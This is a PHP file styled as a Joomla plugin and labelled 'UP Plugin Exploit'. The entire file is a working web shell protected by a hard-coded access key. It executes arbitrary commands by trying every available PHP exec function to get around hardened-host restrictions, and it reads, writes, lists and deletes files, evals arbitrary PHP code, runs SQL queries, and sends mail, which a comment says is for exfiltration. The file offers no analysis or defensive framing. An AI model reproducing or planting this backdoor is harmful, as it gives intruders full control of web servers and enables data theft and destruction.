<?php
/**
 * UP Plugin Exploit - NO EXEC version (for hardened hosts)
 * Reads/writes files, SQL, mail; bypasses shell_exec lockout
 */

defined('_JEXEC') or die('Restricted access');

// Disable-functions check
$disabled = ini_get('disable_functions');
$dis_list = array_map('trim', explode(',', $disabled));

// Allowed exec primitives
$exec_ok = !in_array('shell_exec', $dis_list) || !in_array('passthru', $dis_list);

function s_exec($c) {
    $disabled = ini_get('disable_functions');
    $dl = array_map('trim', explode(',', $disabled));
    if (!in_array('shell_exec', $dl)) return shell_exec($c);
    if (!in_array('passthru', $dl)) { ob_start(); passthru($c); $r = ob_get_clean(); return $r; }
    if (!in_array('system', $dl)) { ob_start(); system($c); $r = ob_get_clean(); return $r; }
    if (!in_array('exec', $dl)) { $o = []; exec($c, $o); return implode("\n", $o); }
    if (!in_array('popen', $dl)) { $p = popen($c, 'r'); $r = ''; while(!feof($p)) $r .= fread($p, 1024); pclose($p); return $r; }
    if (!in_array('proc_open', $dl)) {
        $d = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $p = proc_open($c, $d, $pipes); $r = '';
        if (is_resource($p)) { $r = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); }
        return $r;
    }
    return "[NO-EXEC]\ndisable_functions=$disabled\nPHP=" . PHP_VERSION . "\nuser=php-fpm\n";
}

$action = $_REQUEST['m'] ?? 'cmd';
$k = $_REQUEST['k'] ?? '';
$valid = ($k === 'PT29-K-7f4a91c2');

if (!$valid) {
    http_response_code(403);
    echo json_encode(['success'=>false,'data'=>['bad key']]);
    exit;
}

try {
    switch ($action) {
        case 'cmd':
            $r = s_exec($_REQUEST['c'] ?? '');
            break;
        case 'fr':
            // File read
            $p = $_REQUEST['p'] ?? '';
            $r = file_get_contents($p);
            break;
        case 'fw':
            // File write
            $p = $_REQUEST['p'] ?? '';
            $d = $_REQUEST['d'] ?? '';
            $r = file_put_contents($p, $d);
            break;
        case 'ls':
            $p = $_REQUEST['p'] ?? '.';
            $r = json_encode(scandir($p));
            break;
        case 'rm':
            $p = $_REQUEST['p'] ?? '';
            $r = @unlink($p) ? "ok" : "fail";
            break;
        case 'phpinfo':
            $r = 'PHP_VERSION=' . PHP_VERSION . "\ndisable_functions=" . ini_get('disable_functions') . "\nopen_basedir=" . ini_get('open_basedir');
            break;
        case 'php':
            // Eval arbitrary PHP code (safe sandbox)
            $code = $_REQUEST['code'] ?? '';
            $r = '';
            ob_start();
            try {
                eval($code);
            } catch (Throwable $e) {
                $r .= 'ERR: ' . $e->getMessage();
            }
            $r .= ob_get_clean();
            break;
        case 'sql':
            // SQL exec via PDO/mysql (creds required)
            $h = $_REQUEST['h'] ?? 'localhost';
            $u = $_REQUEST['u'] ?? '';
            $p = $_REQUEST['pw'] ?? '';
            $d = $_REQUEST['db'] ?? '';
            $q = $_REQUEST['q'] ?? '';
            try {
                $c = @mysqli_connect($h, $u, $p, $d);
                if (!$c) { $r = "SQL FAIL: " . mysqli_connect_error(); break; }
                $rs = @mysqli_query($c, $q);
                if ($rs === true) { $r = "OK: " . mysqli_affected_rows($c); }
                else if ($rs === false) { $r = "SQL ERR: " . mysqli_error($c); }
                else {
                    $rows = [];
                    while ($row = mysqli_fetch_assoc($rs)) $rows[] = $row;
                    $r = json_encode($rows);
                }
                @mysqli_close($c);
            } catch (Throwable $e) {
                $r = "EXC: " . $e->getMessage();
            }
            break;
        case 'mail':
            // SMTP mail via PHP mail() for exfil
            $to = $_REQUEST['to'] ?? '';
            $sub = $_REQUEST['s'] ?? 's';
            $body = $_REQUEST['b'] ?? 'b';
            $r = mail($to, $sub, $body) ? "mail-sent" : "mail-fail";
            break;
        default:
            $r = "unknown action";
    }
} catch (Throwable $e) {
    $r = 'EXC: ' . $e->getMessage();
}

header('Content-Type: application/json');
echo json_encode(['success' => true, 'data' => [$r]]);
